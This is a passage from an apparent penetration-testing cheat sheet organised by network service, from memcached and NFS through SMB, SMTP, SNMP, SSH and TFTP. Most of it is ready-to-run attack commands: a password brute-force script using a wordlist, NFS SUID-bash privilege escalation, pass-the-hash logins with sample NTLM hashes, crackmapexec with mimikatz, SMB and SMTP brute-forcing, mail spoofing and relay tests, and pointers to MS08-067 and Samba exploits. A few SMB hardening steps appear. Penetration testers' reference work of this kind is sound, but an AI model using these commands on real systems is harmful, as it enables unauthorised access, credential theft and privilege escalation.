.64.38.3 --username = user --password = pass flag $ nc localhost 112111 get password VALUE password 0 6 3dw4rd END Key information and dump values version stats items STAT items:3:number 1 STAT items:3:age 498 STAT items:22:number 1 STAT items:22:age 498 END stats cachedump stab-id limit stats cachedump 3 100 ITEM views.decorators.cache.cache_header..cc7d9 [ 6 b ; 1256056128 s ] END Increment decrement incr id 1 decr id 1 Set new entry set phone 0 60 9 123456789 Modify value replace key 0 0 2 new - value prepend address 0 0 6 house append address 0 0 6 , 73301 Delete delete old_address flush_all 30 # invalidate all keys after 30 s Dump all keys memcdump --verbose --debug --servers=127.0.0.1 | tee keys.lst Dump all key-values memcached-tool localhost:11211 dump | less while read -r key ; do [ -f $key ] || echo get $key | nc localhost 11211 $key .dump ; done ( memcdump --server localhost ) memcdump --servers = localhost | xargs -L1 -I% sh -c echo get % | nc localhost 11211 memcmd function memcmd () { exec { memcache } /dev/tcp/localhost/11211 printf %s\\n%s\\n $* quit ${ memcache } cat ${ memcache } } 1.4.31 and above memcmd lru_crawler metadump all 1.4.30 and below memcmd stats items memcmd stats cachedump 1 0 for id in $( memcmd stats items | grep -o :[0-9]\\+: | tr -d : | sort -nu ) ; do memcmd stats cachedump $id 0 done Tools Python Library: https://github.com/abstatic/python-memcached-stats Bruteforce #!/usr/bin/python3 import subprocess dictionary = open ( /usr/share/wordlists/rockyou.txt ) for pwd in dictionary : out = subprocess . getoutput ( memcstat --servers=192.64.38.3 --username=student --password= + pwd ) if len ( out ) 0 : print ( out ) print ( PASSWORD: + pwd ) break Hardening References Modbus - 502/tcp Quick Reference Tools Map a SCADA MODBUS TCP based network: https://packetstormsecurity.com/UNIX/scanners/modscan.py.txt Hardening References NFS - 2049/tcp Quick Reference Configuration files / etc / exports / etc / lib / nfs / xtab Enumeration nmap -sV --script = nfs-* 192 .168.44.133 nmap -sV --script = nfs-ls 192 .168.44.133 //same result as rpcinfo nmap -sV --script = nfs-* 192 .168.44.133 Enumerate NFS shares: showmount - e hostname / ip_address Mount NFS shares: mount -t nfs ip_address:/directory_found_exported /local_mount_point mount -t nfs 192 .168.1.72:/home/vulnix /tmp/mnt -nolock / etc / exports file contains configurations and permissions of which folders/file systems are exported to remote users Root squashing - Prevents having root access to remote root users connected to NFS volume. Remote root users are assigned a user \"nfsnobody\" when connected. https://haiderm.com/linux-privilege-escalation-using-weak-nfs-permissions/ no_root_squash - Gives the remote user root access to the connected system With limited user account: cp / bin / bash / shared Then mount the share: mount - t nfs server : / shared / mnt / and run chown root : root bash chmod u + s bash Run the file with limited user account: / shared / bash Tools NFS shell - https://github.com/NetDirect/nfsshell Provides user level access to an NFS server, over UDP or TCP, supports source routing and \"secure\" (privileged port) mounts. nfsshell host ip nfsshell mount name of the share nfsshell gid 1000 nfsshell uid 1000 nfsshell put example nfsshell chmod 0777 example Hardening References http://linuxadministrative.blogspot.com/2014/09/showmount-command-examples.html Exploiting Network File System, (NFS), shares: http://www.vulnerabilityassessment.co.uk/nfs.htm NTP - 123/tcp Quick Reference Configuration files ntp . conf Tools ntptrace - Query to determine from where the NTP server updates its time and traces the chain of NTP servers from a source ntpdc - Query the ntp Deamon about its current state and to request changes in the state ntpdc - c monlist IP_ADDRESS ntpdc - c sysinfo IP_ADDRESS ntpq - Monitors NTP daemon ntpd operations and determine performance Hardening NTPSec IPTables logging References POP3 - 110/tcp Quick Reference Login USER username PASS password Other commands Command Comment USER Your user name for this mail server PASS Your password. QUIT End your session. STAT Number and total size of all messages LIST Message# and size of message RETR message# Retrieve selected message DELE message# Delete selected message NOOP No-op. Keeps you connection open. RSET Reset the mailbox. Undelete deleted messages. TOP 1 0 Return headers only TOP 1 10 Return headers and first 10 lines of body Tools Hardening References PPTP-L2TP-VPN - 500/tcp 1723/tcp Quick Reference Tools Hardening References http://0daysecurity.com/penetration-testing/enumeration.html PSK Cracking using IKE Aggressive Mode: http://www.ernw.de/download/pskattack.pdf Penetration Testing IPsec VPNs: https://www.symantec.com/connect/articles/penetration-testing-ipsec-vpns Scanning and probing a VPN (ikescan): https://www.radarhack.com/dir/papers/Scanning_ike_with_ikescan.pdf RDP - 3389/tcp Quick Reference PTH: xfreerdp / u : testing / d : thinc / pth : 31 d6cfe0d16ae931b73c59d7e0c089c0 / v : 192 . 168 . 1 . 23 Tools List the RDP Connections History: https://github.com/3gstudent/List-RDP-Connections-History Hardening References RDP hijacking\u200a\u2014\u200ahow to hijack RDS and RemoteApp sessions transparently to move through an organisation: https://doublepulsar.com/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6 rlogin - 513/tcp Quick Reference Locating files find / - name . rhosts locate . rhosts Manual login: rlogin hostname - l username Tools Hardening References http://0daysecurity.com/penetration-testing/enumeration.html SMB-Samba-NetBIOS - (137/udp 138/udp), (137/tcp 139/tcp), 445/tcp Quick Reference Summary Summary In computer networking, Server Message Block ( SMB ) , one version of which was also known as Common Internet File System ( CIFS ) , operates as an application - layer network protocol . Mainly used for providing shared access to files , printers , and serial ports and miscellaneous communications between nodes on a network. It also provides an authenticated inter - process communication mechanism. Most usage of SMB involves computers running Microsoft Windows, where it was known as \" Microsoft Windows Network \" before the subsequent introduction of Active Directory . Corresponding Windows services are LAN Manager Server (for the server component) and LAN Manager Workstation (for the client component). SMB can run on top of the session (and lower) network layers in several ways: Directly over TCP , port 445 via the NetBIOS API , which in turn can run on several transports. On UDP ports 137 , 138 TCP ports 137 , 139 ( NetBIOS over TCP / IP ); On several legacy protocols such as NBF , IPX / SPX . The SMB Inter-Process Communication ( IPC ) system provides named pipes and was one of the first inter-process mechanisms commonly available to programmers that provides a means for services to inherit the authentication carried out when a client first connects to an SMB server. Ports netbios-ns 137 / tcp # (NBT over IP) NETBIOS Name Service netbios-ns 137 / udp . netbios-dgm 138 / tcp # (NBT over IP) NETBIOS Datagram Service netbios-dgm 138 / udp . netbios-ssn 139 / tcp # (NBT over IP) NETBIOS session service netbios-ssn 139 / udp . microsoft-ds 445 / tcp # (SMB over IP) If you are using Active Directory (used when SMB is used directly on TCP stack, without using NetBIOS) Version Version enumeration auxiliary / scanner / smb / smb_version Server Message Block (SMB) Versions SMB Version Windows version CIFS Microsoft Windows NT 4.0 SMB 1.0 Windows 2000, Windows XP, Windows Server 2003 and Windows Server 2003 R2 SMB 2.0 Windows Vista Windows Server 2008 SMB 2.1 Windows 7 and Windows Server 2008 R2 SMB 3.0 Windows 8 and Windows Server 2012 SMB 3.0.2 Windows 8.1 and Windows Server 2012 R2 SMB 3.1.1 Windows 10 and Windows Server 2016 Samba Version Enumeration #!/bin/sh # Author: rewardone # Description: # Requires root or enough permissions to use tcpdump # Will listen for the first 7 packets of a null login # and grab the SMB Version # Notes: # Will sometimes not capture or will print multiple # lines. May need to run a second time for success. if [ -z $1 ] ; then echo Usage: ./smbver.sh RHOST {RPORT} exit ; else rhost = $1 ; fi if [ ! -z $2 ] ; then rport = $2 ; else rport = 139 ; fi tcpdump -s0 -n -i tap0 src $rhost and port $rport -A -c 7 2 /dev/null | grep -i samba\\|s.a.m | tr -d . | grep -oP UnixSamba.*[0-9a-z] | tr -d \\n echo -n $rhost : echo exit | smbclient -L $rhost 1 /dev/null 2 /dev/null echo sleep .1 Scanning References: https://www.hackingarticles.in/a-little-guide-to-smb-enumeration https://security.stackexchange.com/questions/119827/missing-scripts-in-nmap nmap ls -lh /usr/share/nmap/scripts/smb* nmap --script safe -p445 $ip nmap --script smb-protocols -p445 $ip nmap -p 139 ,446 $ip --open nmap \u2010v \u2010p 139 ,445 -\u2010script smb\u2010* $ip nmap \u2010v \u2010p 139 ,445 --script vuln $ip nmap \u2010v \u2010p 139 ,445 -\u2010script smb\u2010vuln* $ip nmap \u2010v \u2010p 139 ,445 -\u2010script smb\u2010security\u2010mode $ip nmap \u2010v \u2010p 139 ,445 -\u2010script smb\u2010os-discovery $ip nmap \u2010v \u2010p 139 ,445 -\u2010script smb\u2010check-vulns --script-args = unsafe = 1 $ip smb-vuln-conficker smb-vuln-cve2009-3103 smb-vuln-ms06-025 smb-vuln-ms07-029 smb-vuln-regsvc-dos smb-vuln-ms08-067 nmap --script smb-brute.nse -p445 ( TARGET IP ADDRESS ) nmap -p 139 .445 --script smb-enum-users ( TARGET IP ADDRESS ) Enable / Disable / Status Detect, enable and disableyeha SMBv1, SMBv2, and SMBv3 in Windows and Windows Server: https://support.microsoft.com/en-gb/help/2696547/how-to-detect-enable-and-disable-smbv1-smbv2-and-smbv3-in-windows-and Windows Server 2012 R2 2016: PowerShell methods SMB v1 Detect: Get - WindowsFeature FS - SMB1 Disable: Disable - WindowsOptionalFeature - Online - FeatureName smb1protocol Enable: Enable - WindowsOptionalFeature - Online - FeatureName smb1protocol SMB v2/v3 Detect: Get - SmbServerConfiguration | Select EnableSMB2Protocol Disable: Set - SmbServerConfiguration - EnableSMB2Protocol $ false Enable: Set - SmbServerConfiguration - EnableSMB2Protocol $ true Windows 8.1 and Windows 10: PowerShell method SMB v1 Protocol Detect: Get - WindowsOptionalFeature \u2013 Online \u2013 FeatureName SMB1Protocol Disable: Disable - WindowsOptionalFeature - Online - FeatureName SMB1Protocol Enable: Enable - WindowsOptionalFeature - Online - FeatureName SMB1Protocol SMB v2/v3 Protocol Detect: Get - SmbServerConfiguration | Select EnableSMB2Protocol Disable: Set - SmbServerConfiguration \u2013 EnableSMB2Protocol $ false Enable: Set - SmbServerConfiguration \u2013 EnableSMB2Protocol $ true Windows 8 and Windows Server 2012 SMB v1 on SMB Server Detect: Get - SmbServerConfiguration | Select EnableSMB1Protocol Disable: Set - SmbServerConfiguration - EnableSMB1Protocol $ false Enable: Set - SmbServerConfiguration - EnableSMB1Protocol $ true SMB v2/v3 on SMB Server Detect: Get - SmbServerConfiguration | Select EnableSMB2Protocol Disable: Set - SmbServerConfiguration - EnableSMB2Protocol $ false Enable: Set - SmbServerConfiguration - EnableSMB2Protocol $ true Windows 7, Windows Server 2008 R2, Windows Vista, and Windows Server 2008 SMB v1 on SMB Server Default configuration = Enabled (No registry key is created), so no SMB1 value will be returned Detect: Get - Item HKLM : \\ SYSTEM \\ CurrentControlSet \\ Services \\ LanmanServer \\ Parameters | ForEach - Object { Get - ItemProperty $ _ . pspath } Disable: Set - ItemProperty - Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters SMB1 - Type DWORD - Value 0 \u2013 Force Enable: Set - ItemProperty - Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters SMB1 - Type DWORD - Value 1 \u2013 Force SMB v2/v3 on SMB Server Detect: Get - ItemProperty HKLM : \\ SYSTEM \\ CurrentControlSet \\ Services \\ LanmanServer \\ Parameters | ForEach - Object { Get - ItemProperty $ _ . pspath } Disable: Set - ItemProperty - Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters SMB2 - Type DWORD - Value 0 \u2013 Force Enable: Set - ItemProperty - Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters SMB2 - Type DWORD - Value 1 \u2013 Force Disable SMB Client SMB v1 on SMB Client Detect: sc . exe qc lanmanworkstation Disable: sc.exe config lanmanworkstation depend = bowser/mrxsmb20/nsi sc.exe config mrxsmb10 start = disabled Enable: sc.exe config lanmanworkstation depend = bowser/mrxsmb10/mrxsmb20/nsi sc.exe config mrxsmb10 start = auto SMB v2/v3 on SMB Client Detect: sc . exe qc lanmanworkstation Disable: sc.exe config lanmanworkstation depend = bowser/mrxsmb10/nsi sc.exe config mrxsmb20 start = disabled Enable: sc.exe config lanmanworkstation depend = bowser/mrxsmb10/mrxsmb20/nsi sc.exe config mrxsmb20 start = auto Other NetBIOS suffixes For unique names: 00 : Workstation Service ( workstation name ) 03 : Windows Messenger service 06 : Remote Access Service 20 : File Service ( also called Host Record ) 21 : Remote Access Service client 1 B : Domain Master Browser \u2013 Primary Domain Controller for a domain 1 D : Master Browser For group names: 00 : Workstation Service ( workgroup / domain name ) 1 C : Domain Controllers for a domain 1 E : Browser Service Elections User enumerate: scanner / smb / smb_lookupsid Bruteforcing: auxiliary/scanner/smb/smb_login while read USER ; do echo $USER smbmap -H 10 .10.10.172 -u $USER -p $USER ; done userslist patator smb_login host = 10 .121.1.33 domain = CONTOSO user = COMBO00 password = COMBO01 0 = /root/oscp/lab-net2019/combo-creds.txt -l smb_brute patator smb_login host = FILE0 domain = CONTOSO.LOCAL user = COMBO10 password = COMBO11 0 = /root/oscp/lab-net2019/smb-open.txt 1 = /root/oscp/lab-net2019/combo-creds.txt -x ignore:fgrep = \u201dSTATUS_LOGON_FAILURE\u201d \u2013timeout 100 \u2013threads = 2 \u2013rate-limit = 2 Mount SMB share sudo apt-get install cifs-utils mkdir /mnt/ $shareName mount -t cifs // $ip / $shareName /mnt/ $shareName -o username = $username ,password = $password ,domain = $domain mount -t auto --source //192.168.31.147/kathy --target /tmp/smb/ -o username = root,workgroup = WORKGROUP mount -t cifs //10.10.10.134/backups /mnt/share -o user = ,password = net use X : \\\\ server \\ sharename / USER : domain \\ username password / PERSISTENT : YES Null Session Enumeration (enabled by default in SMB1) net use \\\\ 192 . 168 . 1 . 1 \\ ipc$ / u : net view \\\\ ip_address rpcclient -U ip ( give empty password ) srvinfo enumdomusers getdompwinfo Use UpTime to guess patch level: https://github.com/SpiderLabs/Responder/blob/master/tools/FindSMB2UPTime.py python FindSMB2UpTime.py 172 .16.80.10 Samba Configuration Files / etc / samba / smb . conf smb . conf lmhosts Test reload configuration testparm - v service smb restart User creation: smbpasswd - a username Tools nmblookup Query NetBIOS names and map them to IP addresses in a network Using NetBIOS over TCP/IP queries nmblookup - A $ ip nbtscan Scan NetBIOS name servers open on a local or remote TCP/IP network Works on a whole subnet instead of individual IP Similar to nbtstat (Windows standard tool) nbtscan $ ip / 24 nbtstat nbtstat $ ip nbtscan - \u2010 r $ ip / 24 nbtstat -c: displays the contents of the NetBIOS name cache, the table of NetBIOS names and their resolved IP addresses. nbtstat -n: displays the names that have been registered locally on the system. nbtstat -r: displays the count of all NetBIOS names resolved by broadcast and querying a WINS server. nbtstat -R: purges and reloads the remote cache name table. nbtstat -RR: sends name release packets to WINs and then starts Refresh. nbtstat -s: lists the current NetBIOS sessions and their status, including statistics. nbtstat -S: lists sessions table with the destination IP addresses. SMBMap - enumerate samba share drives across an entire domain Allows users to enumerate samba share drives across an entire domain Usage List share drives, drive permissions, share contents Upload/download functionality File name auto-download pattern matching Execute remote commands smbmap -H $ip smbmap -d workgroup -H $ip smbmap -u -p -d workgroup -H $ip smbmap -u guest -p -d workgroup -H $ip smbmap -u user -p password -d workgroup -H $ip smbmap -u user -p password -d workgroup -H $ip -L #test command execution smbmap -u user -p password -d workgroup -H $ip -r #read drive smbmap -u -p -H 192 .168.1.23 # similar to crackmapexec --shares smbmap -u guest -p -H 192 .168.1.23 smbmap -u Administrator -p aad3b435b51404eeaad3b435b51404ee:e101cbd92f05790d1a202bf91274f2e7 -H 192 .168.1.23 smbmap -u Administrator -p aad3b435b51404eeaad3b435b51404ee:e101cbd92f05790d1a202bf91274f2e7 -H 192 .168.1.23 -r # list top level dir smbmap -u Administrator -p aad3b435b51404eeaad3b435b51404ee:e101cbd92f05790d1a202bf91274f2e7 -H 192 .168.1.23 -R # list everything recursively smbmap -u Administrator -p aad3b435b51404eeaad3b435b51404ee:e101cbd92f05790d1a202bf91274f2e7 -H 192 .168.1.23 -s wwwroot -R -A .* # download everything recursively in the wwwroot share to /usr/share/smbmap. great when smbclient doesnt work smbmap -u Administrator -p aad3b435b51404eeaad3b435b51404ee:e101cbd92f05790d1a202bf91274f2e7 -H 192 .168.1.23 -x whoami # no work Recursively list dirs, and files: smbmap -R $sharename -H $ip Search for Groups . xml in given share: smbmap -R $shareName -H $ip -A Groups.xml -q Downloads a file in quiet mode: smbmap -R $sharename -H $ip -A $fileyouwanttodownload -q Using hash: mbmap.py -u user123 -p aad3b435b51404eeaad3b435b51404ee:0B186E661BBDBDFFFFFFFFFFF8B9FD8B -H ( TARGET IP ADDRESS ) smbclient https://www.samba.org/samba/docs/current/man-html/smbclient.1.html Client that can \"talk\" to an SMB/CIFS server Operations Upload/download functionality Retrieving directory information smbclient // 192 . 168 . 1 . 23 / wwwroot smbclient // 192 . 168 . 1 . 23 / C $ WIN20082017 - U Administrator smbclient // 192 . 168 . 1 . 23 / C $ A433F6C2B0D8BB92D7288ECFFACFC7CD - U Administrator --pw-nt-hash # make sure to only use the NT portion of the hash smbclient - L \\\\ WIN7 \\ IPC$ - I 192 . 168 . 13 . 218 smbclient \\\\ 192 . 168 . 13 . 236 \\ some - share - o user = root , pass = root , workgroup = BOB smbclient - L $ ip - U guest - p 445 smbclient - L $ ip - U $ username - p 445 password : prompt smbclient - L // server / share smbclient - L // server / share password options Null session: smbclient - N - L ( TARGET IP ) - m SMB2 Null session mount: smbclient \\\\\\\\(TARGET IP)\\\\IPC\\$\\\\ - N - m SMB2 User session mount: smbclient \\\\\\\\(TARGET IP)\\\\IPC\\$\\\\ - N - U ( USER ) - m SMB2 Kerberos Auth: smbclient --kerberos //ws01win10.domain.com/C$ Pass the hash: smbclient --user=(TARGET USERNAME) --pw-nt-hash -m smb3 \\\\\\\\(TARGET IP ADDRESS)\\\\(TARGET SHARE)\\\\ (NTLM HASH) Upload file: smbclient // 192 . 168 . 31 . 142 / ADMIN $ - U nobody % somepassword - c put 40280.py Pass-the-hash: smbclient - U testuser % nthash --pw-nt-hash -L 192.168.0.1 smbclient \\\\\\\\ 192 . 168 . 0 . 1 \\\\ domain - U testuser % nthash --pw-nt-hash Map drives: smbclient \\\\\\\\ 192 . 168 . 0 . 1 \\\\ sharename$ smbclient \\\\\\\\ 192 . 168 . 0 . 1 \\\\ sharename$ - U root % Recursive download: https://superuser.com/questions/856617/how-do-i-recursively-download-a-directory-using-smbclient smbclient \\10.11.1.220\\SYSVOL - U = contoso/jane%SuperPassword^ - c prompt OFF;recurse ON;lcd . / ;mget * smb : \\ RECURSE ON smb : \\ PROMPT OFF smb : \\ mget * mask recurse ON prompt OFF cd path\\to\\remote\\dir lcd ~/path/to/download/to/ mget * rpcclient Part of the Samba suite Developed to test MS-RPC functionality in Samba Usable to open an authenticated SMB session to a target machine NULL session: rpcclient - U - N 192 . 168 . 1 . 102 User session: rpcclient - U htb \\\\ james mantis . htb . local Kerberos Auth rpcclient - k ws01win10 . domain . com Querying: rpcclient $ srvinfo # operating system version rpcclient $ enum tab tab rpcclient $ enumdomusers // Username and RID ( suffix of SID ) rpcclient $ queryuser 0 x3e8 // Info of the user for given RID rpcclient $ enumalsgroups domain // Enum aliases groups rpcclient $ enumalsgroups builtin rpcclient $ lookupnames james rpcclient $ netshareenumall # enumerate all shares and its paths rpcclient $ enumdomusers # enumerate usernames defined on the server rpcclient $ getdompwinfo # smb password policy configured on the server Change password: setuserinfo2 administrator 23 \u2018 password1234 \u2019 Lookup SID: lookupnames administrator rpcdump.py rpcdump . py username : password @IP_Address port / protocol ( i . e . 80 / HTTP ) rpcinfo rpcinfo [ options ] IP_Address Enum4linux Tool for enumerating information from Windows and Samba systems Wrapper for smbclient , rpcclient , net and nmblookup enum4linux - a $ip enum4linux - U $ip - RID cycling ( When RestrictAnonymous is set to 1 on Windows 2000 ) - User listing ( When RestrictAnonymous is set to 0 on Windows 2000 ) - Listing of group membership information - Share enumeration - Detecting if the host is in a workgroup or a domain - Identifying the remote operating system - Password policy retrieval pth-winexe pth-winexe -U administrator%WIN20082017 //192.168.1.23 cmd # using a plaintext password pth-winexe -U Administrator%A433F6C2B0D8BB92D7288ECFFACFC7CD //192.168.1.23 cmd # ntlm hash encrypted with https://www.browserling.com/tools/ntlm-hash pth-winexe -U domain/user%A433F6C2B0D8BB92D7288ECFFACFC7CD //192.168.1.23 cmd # domain user pth-winexe -U Administrator%8F49412C8D29DF02FB62879E33FBB745:A433F6C2B0D8BB92D7288ECFFACFC7CD //192.168.1.23 cmd # lm+ntlm hash encrypted with https://asecuritysite.com/encryption/lmhash pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:A433F6C2B0D8BB92D7288ECFFACFC7CD //192.168.1.23 cmd # ntlm hash + empty lm hash # or export SMBHASH = aad3b435b51404eeaad3b435b51404ee:6F403D3166024568403A94C3A6561896 pth-winexe -U Administrator% //192.168.1.23 cmd nullinux https://github.com/m8r0wn/nullinux python3 nullinux.py -users -quick DC1.Domain.net python3 nullinux.py -all 192 .168.0.0-5 python3 nullinux.py -shares -U Domain\\User -P Password1 10 .0.0.1,10.0.0.5 acccheck Password attacks acccheck - v - t $ ip - u user - P password_file mblookup NetBIOS over TCP/IP client used to lookup NetBIOS names CrackMapExec Automate assessing the security of large Active Directory networks crackmapexec smb target ( s ) -u username -H LMHASH:NTHASH crackmapexec smb target ( s ) -u username -H NTHASH crackmapexec -u guest -p --shares 192 .168.1.23 crackmapexec -u guest -p --rid-brute 4000 192 .168.1.23 crackmapexec -u guest -p --users 192 .168.1.23 crackmapexec smb 192 .168.1.0/24 -u Administrator -p P@ssw0rd crackmapexec smb 192 .168.1.0/24 -u Administrator -H E52CAC67419A9A2238F10713B629B565:64F12CDDAA88057E06A81B54E73B949B crackmapexec -u Administrator -H E52CAC67419A9A2238F10713B629B565:64F12CDDAA88057E06A81B54E73B949B -M mimikatz 192 .168.1.0/24 crackmapexec -u Administrator -H E52CAC67419A9A2238F10713B629B565:64F12CDDAA88057E06A81B54E73B949B -x whoami 192 .168.1.23 crackmapexec -u Administrator -H E52CAC67419A9A2238F10713B629B565:64F12CDDAA88057E06A81B54E73B949B --exec-method smbexec -x whoami 192 .168.1.23 # reliable pth code execution Smbexec https://github.com/brav0hax/smbexec wmiexec https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py . / wmiexec . py - hashes ntlmhash Administrator @10.10.0.1 SuperScan Hyena Winfingerprint NetBIOS enumerator Vulnerabilities Linux CVE-2007-2447 - Samba versions 3.0.20 through 3.0.25rc3 When the \"username map script\" smb.conf option is enabled https://github.com/amriunix/cve-2007-2447 exploit / windows / smb / ms08_067_netapi Windows CVE-2008-4250 MS08-067 - Microsoft Server Service Relative Path Stack Corruption Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2, Vista Gold and SP1, Server 2008, and 7 Pre-Beta https://github.com/jivoi/pentest/blob/master/exploit_win/ms08-067.py https://vulners.com/exploitdb/EDB-ID:6824 exploit / windows / smb / ms08_067_netapi Hardening References NetBios https://dzone.com/articles/practical-fun-with-netbios-name-service-and-comput https://dzone.com/articles/fun-with-netbios-name-service-and-computer-browser https://www.youtube.com/watch?v=jUc1J31DNdw t=445s Implementing CIFS - The Common Internet Filesystem - http://www.ubiqx.org/cifs/ Using Samba 2 nd Edition - http://www.samba.org/samba/docs/using_samba/toc.html SMTP - 25/tcp Quick Reference Connect: nc - \u2010 nv 192 . 168 . 11 . 215 25 Configuration files sendmail . cf submit . cf User enumeration with: \"VRFY\", \"EXPN\" \"RCPT\" commands: smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t 10 .11.1.22 VRFY username ( verifies if username exists - enumeration of accounts ) EXPN username ( verifies if username is valid - enumeration of accounts ) VRFY existing_user Results in: 250 VRFY nonexisting_user Results in: 550 for user in $( cat users.txt ) ; do echo VRFY $user | nc -nv -w ip 25 2 /dev/null | grep ^ 250 ; done Mail Spoofing: http://0daysecurity.com/penetration-testing/enumeration.html HELO anything MAIL FROM : spoofed_address RCPT TO : valid_mail_account DATA . QUIT Mail Relay HELO anything Identical to / from - mail from : nobody @ domain rcpt to : nobody @ domain Unknown domain - mail from : user @ unknown_domain Domain not present - mail from : user @ localhost Domain not supplied - mail from : user Source address omission - mail from : rcpt to : nobody @ recipient_domain Use IP address of target server - mail from : user @ IP_Address rcpt to : nobody @ recipient_domain Use double quotes - mail from : user @ domain rcpt to : user@recipent-domain User IP address of the target server - mail from : user @ domain rcpt to : nobody @ recipient_domain @[ IP Address ] Disparate formatting - mail from : user @[ IP Address ] rcpt to : @ domain : nobody @ recipient - domain Disparate formatting2 - mail from : user @[ IP Address ] rcpt to : recipient_domain ! nobody @[ IP Address ] http://0daysecurity.com/penetration-testing/enumeration.html Sending a mail HELO my . server . com MAIL FROM : RCPT TO : DATA From : Danny Dolittle To : Sarah Smith Subject : Email sample Mime - Version : 1 . 0 Content - Type : text / plain ; charset=us-ascii This is a test email for you to read . . QUIT Brute-forcing: hydra ( TARGET IP ADDRESS ) smtp - l ( USERNAME ) - P / path / to / wordlist . txt - V - s ( TARGET PORT ) Other commands Command Comment ATRN Authenticated TURN AUTH Authentication BDAT Binary data BURL Remote content DATA The actual email message to be sent. This command is terminated with a line that contains only a EHLO Extended HELO ETRN Extended turn EXPN Expand HELO Identify yourself to the SMTP server. HELP Show available commands MAIL Send mail from email account, MAIL FROM: NOOP No-op. Keeps you connection open. ONEX One message transaction only QUIT End session RCPT Send email to recipient, RCPT TO: RSET Reset SAML Send and mail SEND Send SOML Send or mail STARTTLS SUBMITTER SMTP responsible submitter TURN Turn VERB Verbose VRFY Verify Tools smtp_enum: auxiliary / scanner / smtp / smtp_enum smtp-enum-users.nse: nmap \u2013 script smtp - enum - users . nse 172 . 16 . 212 . 133 Hardening References SNMP - 161/udp Quick Reference Baed on UDP - Can be suspectable for IP spoofing and replay 1,2,2c versions are plain text Week auth and default community strings (public, default) Devices often support configuration file read and write through private SNMP community string access. Hence having access to private string means router configuration can be altered. Configuration Files snmp . conf snmpd . conf snmp - config . xml SNMP - Management Information Base (MBI) Tree database related to network management. http://publib.boulder.ibm.com/infocenter/pseries/v5r3/index.jsp?topic=/com.ibm.aix.progcomm/doc/progcomc/mib.htm commuity strings - public / private / manager / ... Scanning nmap - sU - p 161 --open ip nmap - sU - p 161 --script=*snmp* 192.168.1.200 xprobe2 - v - p udp : 161 : open 192 . 168 . 1 . 200 auxiliary / scanner / snmp / snmp_login auxiliary / scanner / snmp / snmp_enum Default community strings public private cisco cable - docsis ILMI Important Properties: Windows NT .1.3.6.1.2.1.1.5 Hostnames .1.3.6.1.2.1.4.34.1.5.2.16 IPv6 Address .1.3.6.1.4.1.77.1.4.2 Domain Name .1.3.6.1.4.1.77.1.2.25 Usernames .1.3.6.1.4.1.77.1.2.3.1.1 Running Services .1.3.6.1.4.1.77.1.2.27 Share Information Commands: snmp - check 192 . 168 . 1 . 2 - c public snmpget - v 1 - c public IP snmpbulkwalk - v2c - c public - Cn0 - Cr10 IP Tools SNMPWalk sudo apt install --no-upgrade snmp-mibs-downloader snmpwalk - Os - c public - v 1 ip snmpwalk - c public ( TARGET IP ADDRESS ) - v1 - On snmpwalk - c public - v2c ( TARGET IP ADDRESS ) v3 doesnt have easily guessable / default community string Probe MBI snmpwalk - c public - v 1 ip 1 . 3 . 6 . 1 . 2 . 1 . 25 . 4 . 2 . 1 . 2 \u2022 1 . 3 . 6 . 1 . 2 . 1 . 25 . 1 . 6 . 0 System Processes \u2022 1 . 3 . 6 . 1 . 2 . 1 . 25 . 4 . 2 . 1 . 2 Running Programs \u2022 1 . 3 . 6 . 1 . 2 . 1 . 25 . 4 . 2 . 1 . 4 Processes Path \u2022 1 . 3 . 6 . 1 . 2 . 1 . 25 . 2 . 3 . 1 . 4 Storage Units \u2022 1 . 3 . 6 . 1 . 2 . 1 . 25 . 6 . 3 . 1 . 2 Software Name \u2022 1 . 3 . 6 . 1 . 4 . 1 . 77 . 1 . 2 . 25 User Accounts \u2022 1 . 3 . 6 . 1 . 2 . 1 . 6 . 13 . 1 . 3 TCP Local Ports onesixtyone Scan one community string for multiple IPs onesixtyone - c community . txt - i ips . txt onesixtyone - c / pwnt / passwords / wordlists / SecLists / Discovery / SNMP / snmp . txt ( TARGET IP ADDRESS ) snmpenum: perl snmpenum . pl 192 . 168 . 38 . 200 public windows . txt OpUtils SolarWinds SNScan SNMP Scanner NS Auditor snmpcheck Hardening References SquidProxy - 3128/tcp Quick Reference Usable in pivoting: auxiliary / scanner / http / squid_pivot_scanning nikto - h http : // ( TARGET IP ADDRESS ) - useproxy http : // ( TARGET IP ADDRESS ): 3128 Tools Hardening References SSH - 22/tcp Quick Reference User Enumeration: searchsploit - m 40136 auxiliary / scanner / ssh / ssh_enumusers Configuration Files ssh_config sshd_config authorized_keys ssh_known_hosts . shosts PPK (Putty) to SSH/RSA key-file puttygen my_private_key . ppk - O private - openssh - o keyfile chmood 600 keyfile ssh - l ( USERNAME ) ( TARGET IP ADDRESS ) - i keyfile RSA key cracking ssh2john id_rsa id_rsa . john john --wordlist=/path/to/rockyou.txt id_rsa.john Tools scanssh scanssh - p - r - e excludes random ( no . ) / Network_ID / Subnet_Mask HASSH - a Profiling Method for SSH Clients and Servers: https://github.com/salesforce/hassh/ \"HASSH\" is a network fingerprinting standard which can be used to identify specific Client and Server SSH implementations. The fingerprints can be easily stored, searched and shared in the form of an MD5 fingerprint. Hardening SSH Auditor: https://github.com/ncsa/ssh-auditor Re-check all known hosts as new credentials are added. It will only check the new credentials. Queue a full credential scan on any new host discovered. Queue a full credential scan on any known host whose ssh version or key fingerprint changes. Attempt command execution as well as attempt to tunnel a TCP connection. Re-check each credential using a per credential scan_interval - default 14 days. References Telnet - 23/tcp Quick Reference Configuration files / etc / inetd . conf / etc / xinetd . d / telnet / etc / xinetd . d / stelnet Tools Telnet Honeypot - https://github.com/stamparm/hontel OS fingerprinting with telnet: https://securiteam.com/tools/6J00L0K06U/ Hardening References TFTP - 69/tcp Quick Reference Enumeration tftp ip_address PUT local_file tftp ip_address GET conf.txt ( or other files ) Solarwinds TFTP server tftp \u2013 i IP GET /etc/passwd ( old Solaris ) Connect TFTP tftp connect ( to ) ip tftp verbose Transfer file 